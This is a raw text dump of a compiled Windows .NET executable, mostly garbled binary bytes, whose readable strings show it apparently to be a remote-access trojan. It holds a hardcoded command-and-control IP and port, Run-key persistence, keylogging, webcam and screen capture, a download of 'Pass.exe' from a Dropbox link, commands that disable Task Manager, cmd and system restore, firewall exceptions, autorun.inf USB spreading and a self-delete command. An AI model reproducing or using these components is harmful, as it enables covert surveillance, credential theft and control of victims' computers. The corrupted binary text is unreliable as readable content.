-3 ¡≈(ÃâL—âY€˘èö9¢‡9∞Ë9∑Ìyº… J ÙÅÊ¸	$3 ?9∑ÒJ ~ ![~ ![TÒQ ëeö)J 1J AJ !A¶ AJ )9J A¶0˘∏Ø Ò¡7	S=Ò”B9ÂÛ IJ  QJG· zÆÒ ]NÒ bUYm\y W
-3 vÃYbÒ çgÒål¡ ó( Y∞p¡ √xQÕ( È ÷~›Éqz3 YÛàÅJ AJ ìA¶õA†)¯az3 Y"àâL2â•â°Æâ'ÆŸ J ¥âJ ∫Ÿ eƒŸ r…ôÑ—âr…Òëÿ	Ñ( Ò†3 ©¿ﬂÒ»3 A ·Â±ÓÎ±ˇÎπz3 3 ¡J  ¡z3 ±'Î7ÔL J  L ç¸	S¡J  ¡ë( L û( L ®L ± L ¸  + F) ˚ k.  ≈.  Œ@  %@ ; FC  %C # .I ˚ Å` + Fc  %c # .i ˚ öÄ ; FÉ # .É K FÉ S Fâ ˚ ¨† ; F° £ F° ´ F£  %£ [ K¿ ; F√ õ ≠√  %‡ ; F ; F  % ; F  %@ %@; F`; F` %Ä; F†; F¿ %¿; F‡; F  % ; F + F@FÄ+ F P P P# P+ P/ P] P_ P° µ Pø PÌÚ˜¸	#.9DdjpwÜçìApú»“Ëˇ		#	<	K	`	r	Ö	ì	∞	      if  É|  ï  ,ß  8¿           	    ΩƒœŸÊÔı7 J U ] d k r í ıC5  C7 1 C9 Ú C; - C= G CQ Ã CS ﬁ FU Ù CW  CY N  [ ó  i ≈ CÉ  CÖ í  á § Câ µ  ã Œ  ç ‹  ï  Có µ Cô  Cõ 8 Cù \ Fü ‰ F°  C£ Ç Ä                `                            ◊               ä               /               p         
-  
-     \    \     \# @ # X    <Module> System.Runtime.CompilerServices CompilationRelaxationsAttribute .ctor RuntimeCompatibilityAttribute Microsoft.VisualBasic.ApplicationServices ApplicationBase System.ComponentModel EditorBrowsableAttribute EditorBrowsableState System.CodeDom.Compiler GeneratedCodeAttribute System.Diagnostics DebuggerNonUserCodeAttribute Microsoft.VisualBasic.Devices Computer DebuggerHiddenAttribute System Object Microsoft.VisualBasic.CompilerServices StandardModuleAttribute Microsoft.VisualBasic HideModuleNameAttribute MyGroupCollectionAttribute RuntimeHelpers GetObjectValue Equals GetHashCode Type RuntimeTypeHandle GetTypeFromHandle ToString Activator CreateInstance System.Runtime.InteropServices ComVisibleAttribute ThreadStaticAttribute CompilerGeneratedAttribute m_ThreadStaticValue User get_GetInstance System.ComponentModel.Design HelpKeywordAttribute STAThreadAttribute System.Net.Sockets TcpClient System.IO FileStream FileInfo MemoryStream Byte Conversions ToBoolean System.Reflection Assembly GetEntryAssembly get_Location Microsoft.Win32 SessionEndingEventArgs Exception IntPtr Zero op_Equality op_Explicit Strings Space String get_Length ProjectData SetProjectError ClearProjectError System.Text Encoding get_UTF8 GetString DirectoryInfo get_Name ToLower Operators CompareString get_Directory get_Parent System.Threading Thread Sleep Monitor Enter Close Stream Dispose set_ReceiveBufferSize set_SendBufferSize Socket get_Client set_SendTimeout set_ReceiveTimeout ToInteger Int32 NewLateBinding LateCall ConditionalCompareObjectEqual Concat Exit Convert FromBase64String Microsoft.VisualBasic.MyServices RegistryProxy ServerComputer get_Registry RegistryKey get_CurrentUser OpenSubKey DeleteValue ToBase64String GetValue Interaction Environ Conversion Hex CompareMethod Split Registry CurrentUser SetValue System.Net WebClient System.Windows.Forms MessageBoxButtons MessageBoxIcon IPEndPoint System.Drawing Bitmap Size Rectangle Graphics Process Start AppWinStyle Shell DialogResult MessageBox Show CreateObject Boolean ChangeType Val Math Round RegistryValueKind Cursor Hide Path GetTempPath File WriteAllBytes Audio get_Audio Stop AudioPlayMode Play IPAddress Parse AddressFamily SocketType ProtocolType EndPoint SendTo Exists DownloadFile ReadAllText ConcatenateObject get_Chars Write ToArray DownloadData GetTempFileName get_Message LateSet LateGet CompareObjectEqual OrObject Screen get_PrimaryScreen get_Bounds get_Width get_Height System.Drawing.Imaging PixelFormat Image FromImage CopyPixelOperation CopyFromScreen Point get_Position Cursors get_Default Draw DrawImage ImageFormat get_Jpeg Save WriteByte EndApp FileSystemInfo get_FullName DateTime Environment get_MachineName get_UserName get_LastWriteTime get_Date ComputerInfo get_Info get_OSFullName Replace OperatingSystem get_OSVersion get_ServicePack SpecialFolder GetFolderPath Contains RegistryKeyPermissionCheck CreateSubKey GetValueNames FileAttributes StreamWriter Application get_ExecutablePath SetAttributes Delete Copy get_LocalMachine FileMode FileSystemProxy get_FileSystem SpecialDirectoriesProxy get_SpecialDirectories get_ProgramFiles Directory GetLogicalDrives TextWriter WriteLine Command Mutex ThreadStart SessionEndingEventHandler SystemEvents add_SessionEnding DoEvents GetCurrentProcess set_MinWorkingSet ConditionalCompareObjectNotEqual System.Security.Cryptography MD5CryptoServiceProvider HashAlgorithm ComputeHash Module Load GetModules GetTypes EndsWith get_Assembly get_Handle get_Available SelectMode Poll NetworkStream GetStream ReadByte ToLong ChrW Char SocketFlags Receive ParameterizedThreadStart Join GetBytes Send DeleteSubKey System.IO.Compression GZipStream CompressionMode set_Position Read BitConverter ToInt32 Keys GetProcessById get_MainWindowTitle DateAndTime get_Now get_ProcessName Keyboard get_Keyboard get_ShiftKeyDown get_CapsLock Enum ToUpper StringBuilder get_CtrlKeyDown Remove MulticastDelegate IAsyncResult AsyncCallback System.Collections.Generic List`1 Add get_Capacity get_Count get_Item Clear w.exe user32 user32.dll winmm.dll avicap32.dll kernel32 ntdll KERNEL32.DLL mscorlib MyApplication w.My MyComputer MyProject MyWebServices ThreadSafeObjectProvider`1 T A w OK kl mgr EnumWindProc EnumChildWindProc m_ComputerObjectProvider m_AppObjectProvider m_UserObjectProvider m_MyWebServicesObjectProvider .cctor get_Computer get_Application get_User get_WebServices o GetType Create__Instance__ instance Dispose__Instance__ main TIP Tport delay udp b BD C Cn DR EXE F FS H HH Idr IsF Isu kq lastcap LO MeM MT NH P PLG RG sf sizk VN VR Y HD anti anti2 usb usbx task mg im a0 a1 ACT BS B Cam GetForegroundWindow GetVolumeInformation GetVolumeInformationA lpRootPathName lpVolumeNameBuffer nVolumeNameSize lpVolumeSerialNumber lpMaximumComponentLength lpFileSystemFlags lpFileSystemNameBuffer nFileSystemNameSize GetWindowText GetWindowTextA hWnd WinTitle MaxLength GetWindowTextLength GetWindowTextLengthA hwnd capGetDriverDescriptionA wDriver lpszName cbName lpszVer cbVer CompDir F1 F2 connect DEB s DLV n ED ENB GTV ret HWD MH apiBlockInput BlockInput fBlock SwapMouseButton bSwap SendMessage msg wParam lparam SetWindowPos hWndInsertAfter x y cx cy wFlags mciSendString mciSendStringA lpCommandString lpReturnString uReturnLength hwndCallback Beep freq dur AddHome text Ind inf INS ko md5 NtSetInformationProcess hProcess processInformationClass processInformation processInformationLength Plugin c pr i RC SB S Sendb STV t typ UNS ZIP LastAS LastAV lastKey Logs vn AV Fix k GetAsyncKeyState a GetKeyboardLayout GetKeyboardState GetWindowThreadProcessId MapVirtualKey ToUnicodeEx d e f g VKCodeToUnicode WRK CLD EnableWindow bEnable lpdwProcessID GetClassName GetClassNameA lpClassName nMaxCount SendMessageA wMsg lParam lpString cch EnumChildWindows lpEnumFunc EnumChild protect GetChild hwd TargetObject TargetMethod BeginInvoke DelegateCallback DelegateAsyncState EndInvoke DelegateAsyncResult Invoke WebServices GetInstance  F a l s e  	T E M P  s e r v e r . e x e  3 7 . 1 4 6 . 2 1 3 . 6 5  	T r u e   2 7 0 1 5  Ae a c 9 e 6 f 2 1 3 1 2 a c f f 1 f a 7 e e c 3 3 1 3 1 f 8 e 3  [S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n  5 1 2  Z G F t Y m 8 =  i m 5 2 3  | ' | ' | s v c h o s t . e x e  C o n n e c t  v n   
-  :  i n f  S o f t w a r e \  S y s t e m D r i v e  \  E R R  ,  SS o f t w a r e \ M i c r o s o f t \ I n t e r n e t   E x p l o r e r \ M a i n  S t a r t   P a g e  	n w p r  	s i t e  f u n  I E h o m e  !s h u t d o w n c o m p u t e r  #s h u t d o w n   - s   - t   0 0 r e s t a r t c o m p u t e r  #s h u t d o w n   - r   - t   0 0 l o g o f f  #s h u t d o w n   - l   - t   0 0 E r o r r M s g  1  2  3  4  5  6  p e e c h  S A P I . S p v o i c e  s p e a k  	B e p X  p i a n o  O p e n C D  +s e t   C D A u d i o   d o o r   o p e n  C l o s e C D  /s e t   C D A u d i o   d o o r   c l o s e d  D i s a b l e K M  E n a b l e K M  T u r n O f f M o n i t o r  T u r n O n M o n i t o r  N o r m a l M o u s e  R e v e r s e M o u s e  D i s a b l e C M D  yH K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ P o l i c i e s \ M i c r o s o f t \ W i n d o w s \ S y s t e m  E n a b l e C M D  0  D i s a b l e R e g i s t r y  ÄóH K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ P o l i c i e s \ S y s t e m  )D i s a b l e R e g i s t r y T o o l s  E n a b l e R e g i s t r y  D i s a b l e R e s t o r e  ÄõH K E Y _ L O C A L _ M A C H I N E \ S O F T W A R E \ M i c r o s o f t \ W i n d o w s   N T \ C u r r e n t V e r s i o n \ S y s t e m R e s t o r e  D i s a b l e S R  E n a b l e R e s t o r e  %D i s a b l e T a s k M a n a g e r  D i s a b l e T a s k M g r  #E n a b l e T a s k M a n a g e r  C u r s o r S h o w  C u r s o r H i d e  s e n d m u s i c p l a y  O p e n S i t e  d o s  u d p  u d p s t p  p i n g s t o p  1t a s k k i l l   / F   / I M   P I N G . E X E  l l  k l  p a s  	t e m p  / p a s s . e x e  mh t t p s : / / d l . d r o p b o x . c o m / s / p 8 4 a a z 2 8 t 0 h e p u l / P a s s . e x e ? d l = 0  / t e m p . t x t  	p r o f  ~  !  g e t v a l u e  @  r n  M S G  E x e c u t e   E R R O R  b l a  D o w n l o a d   E R R O R  .  E x e c u t e d   A s    E x e c u t e   E R R O R    i n v  p l  A  h  p  o s k  s t a r t  O f f  o f f  r e t  G T  C A P  u n  u p  U p d a t e   E R R O R  	. e x e  U p d a t i n g   T o    . .  U p d a t e   E R R O R    E x  P L G  i n d  H  P  c  E R  _  ? ?  y y - M M - d d ? ? - ? ? - ? ? M i c r o s o f t  W i n d o w s  W i n  Æ "!        	  W i n  S P  x 8 6  	  x 6 4  	  x 8 6  Y e s  N o  Gn e t s h   f i r e w a l l   a d d   a l l o w e d p r o g r a m   "  "   "  "   E N A B L E  "  	"   . .  !t a s k k i l l   / F   / I M    a u t o r u n . i n f  [ a u t o r u n ]  o p e n =  s h e l l e x e c u t e =  d i  a c t  x 2  c l e a r    Mn e t s h   f i r e w a l l   d e l e t e   a l l o w e d p r o g r a m   "  S o f t w a r e  3c m d . e x e   / k   p i n g   0   &   d e l   "  "   &   e x i t  	[ k l ]   
-  y y / M M / d d      
- [  ]  [ E N T E R ]  
-  [ T A P ]  
-  2 0  t a s k m g r  p r o c e s s v i e w e r  p r o c e s s h a c k e r  !p r o c e s s   e x p l o r e r  b u t t o n  s t a t i c  d i r e c t u i h w n d  E n d   p r o c e s s     ≥&˛Æ¶dEÉ5≠Züœ            =A     
-     
- U        y  
-  ÄÅ    Äï    Äô    Ä≠  ==       ÄΩ  Ä≈  Ä≈  Ä≈  
- Ä—Ä≈  Ä˘	 Ä˝ ÅÄ›Ä·  =  	 Å     Å! Å% Å) Å) Å-Å1Å5 Å9        == ==    Å=  ÄÒ ÅA ÄıÅE  ÄÌÅI  ÅM	 ÅMÄÌ  Å	 ÄıÄÒ
- ÅE  ÅU	 Ä©ÅU  
-  Ä˘  Å]   Åe   Åi Åm 	 Ä≈Åq   Åu   ÅÅ  ÅÖ  Åâ      Åô Åô Åù  Ä˘    y  Å≠  =  y    Å±  Åµ 
- 
- ÅΩ Å¡   Å  	 Ä©Å… 
-   Ä˘  Å]  ÅŸ   ÅÒ        ∑z\V4‡â∞?_’
-:       
-MyTemplate8.0.0.0     a 4System.Web.Services.Protocols.SoapHttpClientProtocolCreate__Instance__Dispose__Instance__       U      U    =  0 a!e$im( }      "  
-
-  ii     
-
- 		
- 	 
-
-
-       Å Å— Å—   			 		Å·	 	ÅÒ    Å· ,   ÅÈÅÌ ÅÈ  My.Computer    My.Application   U My.User    My.WebServices  (          TWrapNonExceptionThrowsU=   
-ÄÅ
-ÄÅ
-ÄôÄôiÄÅÄÅÄÅÄÅÄÅiÄÅÄÅ
-ÄÅÄ≈Ä¨QÄŸÄŸÄ›Ä·ÄÂÄ≠ÄÅÄÅÄŸÄÅÄÅÄÅmÄÅÄÅÄÅÄÅÄÅÄÅmmÄÈÄÌÄÒÄıÄÈmmÄÅmÄÅÄÅÄÅÄÅmÄÅÄÅÄÅÄÒÄÒÄÒÄÒ.ÄÅÄÅÄÅÄÅÄÅÄÅÄÅÄÅÅ]Å]+ÄÅÄÅÄÅÄÅÄÅÄÅÅuÄÅÅyÄÅ+Ä°ÄÅÄ°ÄÅÄ°(ÄÅÄÅÄÅÄÅÄÅ(	Å≠Å≠==
-
-Ä°ÄÅÄÅimÄÅÄÅÄÅiÄÅÄÅÄÅÄÅÄÅÄÅÄÅÄÅÅ≈m	Ä˘ÄÅÄÅÅ]	ÄÅÄÅÅ—		Å·ÄÅÄÅÅ—ÄÅÄ˘Å·ÅÒ(|´          û´                          ê´                    _CorExeMain mscoree.dll     ˇ%  @                                                                                                Ä                 0  Ä                  H   X¿  Á  ‰      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
-  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
-  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
-    <security>
-      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
-        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
-      </requestedPrivileges>
-    </security>
-  </trustInfo>
-</assembly>
-PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING †     ∞;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
